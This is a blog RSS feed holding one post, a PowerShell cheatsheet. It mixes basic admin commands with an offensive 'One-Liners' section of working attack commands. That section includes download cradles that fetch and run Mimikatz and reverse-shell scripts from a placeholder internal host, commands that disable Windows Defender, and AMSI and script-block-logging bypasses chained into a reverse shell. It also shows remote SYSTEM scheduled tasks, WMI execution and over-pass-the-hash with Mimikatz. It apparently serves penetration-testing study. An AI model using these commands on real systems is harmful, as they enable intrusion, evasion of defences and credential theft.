<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>Posts on Welcome to Tribal Knowledge</title>
        <link>https://tribalknowledgepage.github.io/posts/</link>
        <description>Recent content in Posts on Welcome to Tribal Knowledge</description>
        <generator>Hugo -- gohugo.io</generator>
        <language>en-us</language>
        <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
        <lastBuildDate>Fri, 29 Oct 2021 00:00:00 +0000</lastBuildDate>
        <atom:link href="https://tribalknowledgepage.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
        
        <item>
            <title>PowerShell Cheatsheet</title>
            <link>https://tribalknowledgepage.github.io/posts/2021/10/powershell-cheatsheet/</link>
            <pubDate>Fri, 29 Oct 2021 00:00:00 +0000</pubDate>
            
            <guid>https://tribalknowledgepage.github.io/posts/2021/10/powershell-cheatsheet/</guid>
            <description>This cheatsheet will continue to receive updates.
PowerShell (PS) 101 commands  Please note that all of the following commands are run from a PowerShell prompt.
Retrieve the PowerShell version
$PSVersionTable List help about a cmdlet in a readable format
Get-Help &amp;lt;cmdlet&amp;gt; | more List cmdlets which contain the keyword &amp;lsquo;service&amp;rsquo; in them
Get-Command -CommandType Cmdlet | ?{$_.Name -match &amp;#34;service&amp;#34;} List available commands in the current PS session and their respective details which contain the keyword &amp;lsquo;command&amp;rsquo; in them:</description>
            <content type="html"><![CDATA[
    <img src="https://media.giphy.com/media/8Iv5lqKwKsZ2g/giphy.gif"  alt="alt text"  class="center"   width="400"   height="180"  />


<p>This cheatsheet will continue to receive updates.</p>
<h2 id="powershell-ps-101-commands">PowerShell (PS) 101 commands</h2>
<hr>
<p>Please note that all of the following commands are run from a PowerShell prompt.</p>
<p>Retrieve the PowerShell version</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"> $PSVersionTable 
</code></pre></div><p>List help about a cmdlet in a readable format</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Get-Help &lt;cmdlet&gt; | more
</code></pre></div><p>List cmdlets which contain the keyword &lsquo;service&rsquo; in them</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Get-Command -CommandType Cmdlet | ?{$_.Name <span style="color:#f92672">-match</span> <span style="color:#e6db74">&#34;service&#34;</span>}
</code></pre></div><p>List available commands in the current PS session and their respective details which contain the keyword &lsquo;command&rsquo; in them:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Get-Command -CommandType All -ShowCommandInfo | ?{$_.Name <span style="color:#f92672">-match</span> <span style="color:#e6db74">&#34;command&#34;</span>}
</code></pre></div><p>Wildcards can be used to match as well.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Get-Command -CommandType All | ?{$_.Name <span style="color:#f92672">-match</span> <span style="color:#e6db74">&#34;serv*&#34;</span>}
</code></pre></div><p>Count the number of commands in the output</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">(Get-Command -CommandType All | ?{$_.Name <span style="color:#f92672">-match</span> <span style="color:#e6db74">&#34;command&#34;</span>}).count
</code></pre></div><p>List all cmdlets with PKI as source</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Get-Command -CommandType Cmdlet | ?{$_.Source <span style="color:#f92672">-match</span> <span style="color:#e6db74">&#34;PKI&#34;</span>}
</code></pre></div><p>List available commands in a module by running</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Get-Command -Module &lt;module name&gt;
</code></pre></div><h2 id="handy-tweaks">Handy Tweaks</h2>
<hr>
<p>When you launch PowerShell session, it opens in the user&rsquo;s home directory by default. This behavior can be modified so that new PS sessions open in a custom directory. Here is how:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#75715e"># Check the value of $PROFILE variable.</span>

PS C:\Windows\system32&gt; $PROFILE
C:\Users\XXXXXXXXX\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1

<span style="color:#75715e"># Create the .ps1 file returned from the $PROFILE variable</span>

PS C:\Windows\system32&gt; New-Item -Path $PROFILE -Type File -Force

<span style="color:#75715e"># To set and change the default working directory, open the above &#39;Microsoft.PowerShell_profile.ps1&#39; in ISE and add the following line with your desired path.</span>

Set-location &lt;Custom directory path&gt;
</code></pre></div><h2 id="one-liners">One-Liners</h2>
<hr>
<h3 id="creating-a-firewall-rule-exception-in-windows">Creating a firewall rule exception in Windows</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">New-NetFirewallRule -DisplayName <span style="color:#e6db74">&#39;HTTP-Inbound&#39;</span> -Profile @(<span style="color:#e6db74">&#39;Domain&#39;</span>, <span style="color:#e6db74">&#39;Private&#39;</span>) -Direction Inbound -Action Allow -Protocol TCP -LocalPort @(<span style="color:#e6db74">&#39;80&#39;</span>, <span style="color:#e6db74">&#39;443&#39;</span>)

New-NetFirewallRule -DisplayName <span style="color:#e6db74">&#39;447-Inbound&#39;</span> -Profile @(<span style="color:#e6db74">&#39;Domain&#39;</span>, <span style="color:#e6db74">&#39;Private&#39;</span>) -Direction Inbound -Action Allow -Protocol TCP -LocalPort @(<span style="color:#e6db74">&#39;447&#39;</span>)
</code></pre></div><h3 id="download-cradles">Download cradles</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#75715e"># Option 1 - Using IEX (compatible with older versions of PS)</span>

powershell iex (New-Object Net.WebClient).DownloadString(<span style="color:#e6db74">&#34;http://192.168.X.X/Invoke-MimikatzEX.ps1&#34;</span>)

<span style="color:#75715e"># Option 2 - Using IWR (works on current version of PS)</span>

iwr -UseBasicparsing http<span style="color:#960050;background-color:#1e0010">:</span>//192.168.X.X/Invoke-PowerShellRev.ps1 | iex
</code></pre></div><h3 id="creating-a-credential-object">Creating a Credential object</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">$SecPassword = ConvertTo-SecureString <span style="color:#e6db74">&#39;XXXXXXXXXXXX&#39;</span> -AsPlainText -Force

$Cred = New-Object System.Management.Automation.PSCredential(<span style="color:#e6db74">&#39;domain\user&#39;</span>, $SecPassword)

</code></pre></div><h3 id="decode-base64">Decode Base64</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">$EncodedText = <span style="color:#960050;background-color:#1e0010">“</span>VABoA....<span style="color:#960050;background-color:#1e0010">”</span>

$DecodedText = <span style="color:#66d9ef">[System.Text.Encoding]</span>::Unicode.GetString(<span style="color:#66d9ef">[System.Convert]</span>::FromBase64String($EncodedText))

$DecodedText
</code></pre></div><h3 id="disable-av">Disable AV</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Set-MpPreference -DisableRealtimeMonitoring $true

Set-MpPreference -DisableIOAVProtection $true
</code></pre></div><h3 id="encode-reverse-shell">Encode reverse shell</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">. .\Invoke-Encode.ps1

Invoke-Encode -DataToEncode .\Invoke-PowerShellTcpOneLine.ps1 -OutCommand

<span style="color:#75715e"># Open a listener (nc) on one end and on another shell use: </span>

powershell -e &lt;content of encodedcommand.txt&gt;
</code></pre></div><h3 id="reverse-shell-using-a-batch-file">Reverse shell using a Batch file</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#75715e"># Create reverse.bat file</span>

$Contents = <span style="color:#e6db74">&#39;powershell.exe -c iex ((New-Object Net.WebClient).DownloadString(&#39;&#39;http://192.168.X.X/Invoke-PowerShellRev8080.ps1&#39;&#39;))&#39;</span>
Out-File -Encoding Ascii -InputObject $Contents -FilePath C:\...\Tools\reverse8080.bat

<span style="color:#75715e"># Call reverse.bat file</span>

<span style="color:#75715e">## Option 1</span>
.rotten.exe * reverse.bat

<span style="color:#75715e">## Option 2</span>
Invoke-Mimikatz -Command <span style="color:#e6db74">&#39;&#34;sekurlsa::pth /user:username /domain:srv.contoso.local /ntlm:&lt;NTLMHASH&gt; /run:C:\users\.....\desktop\reverse.bat&#34;&#39;</span>
</code></pre></div><h3 id="scheduled-tasks">Scheduled tasks</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">schtasks /create /S dc.contoso.local /SC Weekly /RU <span style="color:#e6db74">&#34;NT Authority\SYSTEM&#34;</span> /TN <span style="color:#e6db74">&#34;UserX&#34;</span> /TR <span style="color:#e6db74">&#34;powershell.exe -c &#39;iex (New-Object Net.WebClient).DownloadString(&#39;&#39;http://172.16.X.X/Invoke-PowerShellRev8080.ps1&#39;&#39;&#39;)&#39;&#34;</span>

schtasks /Run /S dc.contoso.local /TN <span style="color:#e6db74">&#34;UserX&#34;</span>
</code></pre></div><h3 id="invoke-wmimethod---command-execution-reverse-shell-etc">Invoke-WMIMethod - Command Execution (Reverse shell, etc.)</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Invoke-WmiMethod win32_process -ComputerName dc.contoso.local -name create -argumentlist <span style="color:#e6db74">&#34;powershell.exe -e $encodedCommand&#34;</span>
</code></pre></div><h3 id="chain-powershell-commands-to-bypass-sblogging-then-amsibypass-and-then-get-reverse-shell">Chain powershell commands to Bypass SBLogging, then AMSIBypass and then get reverse shell</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">powershell -c <span style="color:#e6db74">&#34;iex (iwr -UseBasicParsing http://192.168.X.X/sbloggingbypass.txt);iex (iwr -UseBasicParsing http://192.168.X.X/amsibypass.txt);iex (iwr -UseBasicParsing http://192.168.X.X/Invoke-PowerShellTcpEx.ps1)
</span></code></pre></div><h3 id="check-local-admin-access-via-invoke-command">Check local admin access via Invoke-Command</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Invoke-Command -ScriptBlock {whoami;hostname} -ComputerName (Get-Content ..\Output\computers.txt) 2&gt;$null
</code></pre></div><h3 id="over-pass-the-hash">Over pass-the-hash</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Invoke-Mimikatz -Command <span style="color:#e6db74">&#39;&#34;sekurlsa::pth /user:username /domain:srv.contoso.local /ntlm:&lt;NTLMHASH&gt; /run:powershell.exe&#34;&#39;</span>
</code></pre></div><h2 id="playing-with-command-output">Playing with command output</h2>
<hr>
<h3 id="1-expand-redacted-output">1. Expand redacted output</h3>
<p>You might notice that sometimes the output returned by PS commands is redacted with &ldquo;&hellip;&rdquo;. This can be corrected by modifying the value of the PS variable - <code>$FormatEnumerationLimit</code> as follows.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">$FormatEnumerationLimit = -1
</code></pre></div><h3 id="2-using-more-command">2. Using &lsquo;more&rsquo; command</h3>
<p>Piping output of a command to <code>more</code> command makes it readable from the first line. This is equivalent to <code> less</code> command in Linux/Unix.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Get-Process | more
</code></pre></div><h3 id="3-using--expandproperty">3. Using -ExpandProperty</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Get-CimClass -Namespace root/SecurityCenter2 -MethodName * | select -ExpandProperty CimClassMethods
</code></pre></div><h3 id="4-exporting-output-in-a-csv-format">4. Exporting output in a CSV format</h3>
<p>Sometimes (more than we&rsquo;d think) having the output in a CSV file is a blessing. Here is how it can be done using <code>Export-CSV</code> cmdlet.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Get-Date | Select-Object -Property DateTime, Day, DayOfWeek, DayOfYear | Export-Csv -Path .\DateTime.csv -NoTypeInformation
</code></pre></div>]]></content>
        </item>
        
    </channel>
</rss>
